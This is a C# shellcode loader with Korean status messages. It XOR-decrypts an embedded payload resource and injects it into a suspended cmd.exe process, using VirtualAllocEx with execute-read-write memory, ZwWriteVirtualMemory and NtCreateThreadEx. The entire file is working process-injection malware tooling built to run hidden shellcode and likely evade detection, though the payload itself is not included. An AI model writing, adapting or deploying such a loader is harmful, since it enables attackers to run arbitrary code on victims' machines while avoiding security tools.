using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

class Program
{
    [DllImport("kernel32")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    private static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }


    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,
        string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern uint ZwWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress,
        byte[] Buffer, uint BufferLength, out uint BytesWritten);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern uint NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess,
        IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter,
        bool createSuspended, int stackZeroBits, int sizeOfStack, int maxStackSize, IntPtr attributeList);

    const uint CREATE_SUSPENDED = 0x00000004;
    const uint MEM_COMMIT = 0x1000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    static void Main()
    {
        byte[] binData = Loader.Properties.Resources.xor_sc;

        byte[] key = new byte[] { 0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0xff };
        byte[] sc = new byte[binData.Length];
        for (int i = 0; i < binData.Length; i++)
            sc[i] = (byte)(binData[i] ^ key[i % key.Length]);
        Console.WriteLine("[+] xor 복호화 완료");
        Console.Write("[*] 초반 8바이트: ");
        for (int i = 0; i < 8 && i < sc.Length; i++)
        {
            Console.Write($"{sc[i]:X2} ");
        }
        Console.WriteLine();

        string target = "C:\\Windows\\System32\\cmd.exe";
        STARTUPINFO sInfo = new STARTUPINFO();
        sInfo.cb = Marshal.SizeOf(sInfo);
        PROCESS_INFORMATION pInfo;

        if (!CreateProcessA(target, null, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo))
        {
            Console.WriteLine("[!] CreateProcessA 실패");
            return;
        }
        Console.WriteLine("[+] Execute CreateProcessA... ");

        IntPtr allocAddr = VirtualAllocEx(pInfo.hProcess, IntPtr.Zero, (uint)sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (allocAddr == IntPtr.Zero)
        {
            Console.WriteLine("[!] VirtualAllocEx 실패");
            return;
        }
        Console.WriteLine("[+] Execute VirtualAllocEx... ");

        uint bytesWritten;
        uint status = ZwWriteVirtualMemory(pInfo.hProcess, allocAddr, sc, (uint)sc.Length, out bytesWritten);
        if (status != 0)
        {
            Console.WriteLine($"[!] ZwWriteVirtualMemory 실패: 0x{status:X}");
            return;
        }
        Console.WriteLine("[+] Execute ZwWriteVirtualMemory... ");

        IntPtr hThread;
        uint tstatus = NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, pInfo.hProcess, allocAddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
        if (tstatus != 0)
        {
            Console.WriteLine("[!] NtCreateThreadEx 실패: 0x" + status.ToString("X"));
            return;
        }
        Console.WriteLine("[+] Execute NtCreateThreadEx... ");

        Console.WriteLine("[+] 쉘코드 실행 완료");
    }
}
